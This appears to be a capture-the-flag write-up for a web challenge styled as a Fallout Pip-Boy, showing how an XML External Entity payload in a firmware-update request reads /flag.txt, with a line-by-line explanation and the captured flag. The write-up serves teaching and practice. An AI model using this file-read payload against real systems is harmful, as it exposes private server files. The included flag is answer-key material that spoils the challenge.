# Jailbreak
![image](https://github.com/user-attachments/assets/3a083d34-91a5-4097-8bd1-fa5d097c611d)

## Writeup
![image](https://github.com/user-attachments/assets/1c2e4d89-7c28-4424-8a4b-1081264cb1f8)

"Jailbreak" is a web version of the Pip-Boy from the Fallout games. There are different tabs, but the most interesting one is the `rom` tab: here, we can modify the firmware by updating the `XML` file via `POST` requests.

![image](https://github.com/user-attachments/assets/9cbf5daf-f9e2-4b29-bdaa-2f68284f6439)

By analyzing this `XML` document, we can infer that the application extracts a specific value labeled as `Version` from the `XML` input to construct a response message.

So let’s try using some common **XML External Entity (XXE)** payloads in this firmware update function to retrieve the flag:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag.txt" > ]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>1.33.7&xxe;
    </Version>
</FirmwareUpdateConfig>
```

Specifically:
- **`<?xml version="1.0" standalone="yes"?>`**: Standard `XML header`, it says that this XML is `standalone` and it does not depend on an **external** `DTD`
- **`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag.txt" > ]>`**: Defines a **custom** `DOCTYPE` with an **external entity** called `xxe` inside; `SYSTEM "file:///flag.txt"` says that `xxe` should be **replaced** by the contents of the file `/flag.txt`
- **`<Version>1.33.7&xxe;</Version>`**: This `<Version>` element contains some **static text** (`1.33.7`) followed by `&xxe;`, which is a reference to the entity defined above

![Image](https://github.com/user-attachments/assets/bc5c6e8b-8a33-4476-baed-475b553b944c)

**HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_3996d2d9880148f045c5e4fd745e7927}**
